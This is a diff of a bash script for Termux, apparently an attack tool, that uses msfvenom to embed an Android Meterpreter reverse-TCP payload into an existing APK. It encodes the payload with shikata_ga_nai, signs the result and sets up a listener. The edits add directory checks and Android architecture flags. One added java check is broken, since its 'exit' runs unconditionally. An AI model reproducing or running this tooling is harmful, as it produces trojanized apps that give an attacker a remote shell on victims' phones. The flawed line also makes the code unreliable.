@@ -1,5 +1,5 @@
 #!/data/data/com.termux/files/usr/bin/bash
-set -euo pipefail
+#set -euo pipefail
 IFS=$'\n\t'
 trap ctrl_c 2
 function ctrl_c () {
@@ -14,12 +14,20 @@ function ctrl_c () {
 	M='\033[1;35m'
         C='\033[1;36m'
         W='\033[0m'
+if [ ! -d $HOME/java ]; then
+	mkdir -p $HOME/java
+fi
 	TMP_DIR=$HOME/java
 	unsign=$(find $TMP_DIR/unsign -name "output.apk")
 	PAYLOAD=android/meterpreter/reverse_tcp
 	INTER=5
 	ENCODER=x86/shikata_ga_nai
 	LHOST="$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)"
+if [ ! -d $TMP_DIR/unsign ]; then
+	mkdir -p $TMP_DIR/unsign
+fi
+command -v java > /dev/null || printf "$R[ERROR]->$W EMBED need java, please install it"; exit
+
 function Banner {
 	echo $(clear)
 	printf "$Y"
@@ -103,11 +111,12 @@ echo
 Payload() {
 	Banner
 	printf "$C [IbyC]$M Creating payload . . .$W\n"
-	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e $ENCODER -i $INTER
+	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e $ENCODER -i $INTER -a dalvik --platform android
         sign
 }
 sign() {
 	Banner
+if [ ! -z $unsign ]; then
 	printf "$C [IbyC]$M Choose a type of signature
 	\n"
 	printf "$C [1]$G Jarsigner \n"
@@ -136,6 +145,9 @@ sign() {
 	else
 			sign
 	fi
+else
+	printf "$R[ERROR]->$W Not such unsigned apk"
+fi
 }
 Set_Handler() {
 	Banner
